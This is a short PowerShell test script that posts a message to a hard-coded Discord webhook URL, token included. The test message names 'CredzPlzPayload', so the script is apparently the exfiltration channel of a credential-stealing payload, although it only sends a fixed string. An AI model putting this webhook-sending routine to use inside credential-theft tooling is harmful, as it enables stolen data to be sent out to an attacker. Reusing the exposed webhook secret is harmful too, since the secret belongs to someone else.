# Simple Test Script
$DiscordWebhookUrl = "https://discord.com/api/webhooks/1305290003944833035/pzY6f_l01DPtZTxZnvmKQhCCieC-Z4z1yegIXySBcxIPoZhrN-npmasRTFSuk3fflQGW"

function Send-ToDiscord {
    param ($Message)
    $payload = @{
        "content" = "```$Message```"
    } | ConvertTo-Json

    try {
        Invoke-RestMethod -Uri $DiscordWebhookUrl -Method Post -ContentType "application/json" -Body $payload
        Write-Host "Data sent to Discord successfully."
    } catch {
        Write-Error "Failed to send data to Discord."
    }
}

# Test message
Send-ToDiscord -Message "This is a test message from CredzPlzPayload."
